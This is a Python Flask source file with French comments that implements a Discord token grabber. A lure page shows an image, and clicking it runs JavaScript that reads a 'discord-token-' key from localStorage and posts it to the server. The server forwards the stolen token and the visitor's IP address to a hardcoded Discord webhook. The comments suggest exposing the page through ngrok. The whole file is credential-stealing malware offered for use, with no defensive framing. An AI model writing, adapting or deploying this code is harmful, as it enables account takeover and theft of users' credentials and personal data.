from flask import Flask, render_template_string, request
import requests
import json
import os

# --- CONFIGURATION ---
# Remplace par ton Webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG"

# HTML de la page piégée
# C'est une image qui, quand on clique, lance le script de vol
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body { margin: 0; background: #18191c; display: flex; justify-content: center; align-items: center; height: 100vh; }
        img { max-width: 80%; max-height: 80%; cursor: pointer; border-radius: 10px; }
        .click-hint { position: absolute; bottom: 20px; color: #fff; font-family: sans-serif; }
    </style>
</head>
<body>
    <!-- Image d'exemple : change l'URL par ton image -->
    <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558" id="trapImage">
    <div class="click-hint">Clique pour voir l'image en grand</div>

    <script>
        document.getElementById('trapImage').addEventListener('click', function() {
            // 1. Chercher le token dans le LocalStorage
            let token = null;
            for (let key in localStorage) {
                if (key.startsWith('discord-token-')) {
                    token = localStorage.getItem(key);
                    break;
                }
            }

            if (token) {
                // 2. Envoyer le token au serveur Python
                fetch('/send-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token: token })
                }).then(() => {
                    // 3. Rediriger vers l'image originale ou une page neutre
                    window.location.href = "https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558";
                });
            } else {
                alert("Token non trouvé. Es-tu connecté à Discord dans ce navigateur ?");
            }
        });
    </script>
</body>
</html>
"""

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send-token', methods=['POST'])
def send_token():
    data = request.json
    token = data.get('token', 'Inconnu')
    
    # Récupérer l'IP du client
    ip = request.remote_addr
    
    # Envoyer à ton Webhook Discord
    payload = {
        "content": "**Nouveau Token Capturé !**",
        "embeds": [{
            "title": "Token Grabbed",
            "color": 16711680,
            "fields": [
                {"name": "Token", "value": f"`{token}`", "inline": False},
                {"name": "IP Address", "value": ip, "inline": True}
            ]
        }]
    }
    
    requests.post(WEBHOOK_URL, json=payload)
    return "OK"

if __name__ == '__main__':
    # Lance le serveur sur le port 5000
    # Utilise ngrok pour exposer le lien
    app.run(host='0.0.0.0', port=5000)
